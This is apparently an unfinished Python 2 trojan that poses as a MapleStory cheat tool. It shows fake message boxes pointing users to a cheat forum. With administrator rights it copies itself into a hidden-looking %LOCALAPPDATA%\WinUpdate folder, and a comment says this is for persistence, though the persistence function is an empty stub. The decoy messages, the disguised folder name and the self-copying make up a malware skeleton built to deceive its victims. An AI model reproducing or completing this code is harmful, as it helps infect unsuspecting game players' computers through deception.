import ctypes  # An included library with Python install.
import os
import time
import shutil
from threading import Thread
from _winreg import *

'''
##  Styles:
##  0 : OK
##  1 : OK | Cancel
##  2 : Abort | Retry | Ignore
##  3 : Yes | No | Cancel
##  4 : Yes | No
##  5 : Retry | No 
##  6 : Cancel | Try Again | Continue
'''


def checkLocal():
    """check if a folder in %LOCALAPPDATA% with the name WinUpdate exist
    if it does, then dont display the msgbox
    if not run the program as normal and create persistence
    """
    directory = "{}\\WinUpdate".format(os.getenv('LOCALAPPDATA'))
    if not os.path.exists(directory):
        if isAdmin():
            Thread(target=forUserToSee).start()
            Thread(target=createFileInTemp(directory)).start()
            Thread(target=createPersistence).start()
    else:
        Thread(target=forUserToSee).start()
        print "checking folder exist - script was ran before"


def copyItselfIntoTarget(directory):
    own_name = os.path.basename(__file__)
    shutil.copy(__file__, "{}\\{}".format(directory, own_name))
    print "file copied over"


def createFileInTemp(directory):
    os.makedirs(directory)
    print "checking folder does not exist - checking folder created"
    copyItselfIntoTarget(directory)


def createPersistence():
    pass


def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin


def forUserToSee():
    filename = os.path.basename(__file__)
    is_admin_title = "Warning"
    is_admin_msg = '''Your hack version is not updated
The program will end to avoid detection by Maplestory.exe
For more info, please visit https://www.mpgh.net/forum/98-maple-story-hacks/'''.format(filename)
    not_admin_title = "Error"
    not_admin_msg = "You will need to run this hack in administrator mode for it to be able to hook onto the maplestory process"

    if isAdmin():
        ctypes.windll.user32.MessageBoxA(0, is_admin_msg, is_admin_title, 0)
    else:
        ctypes.windll.user32.MessageBoxA(0, not_admin_msg, not_admin_title, 0)


def main():
    checkLocal()


if __name__ == '__main__':
    main()
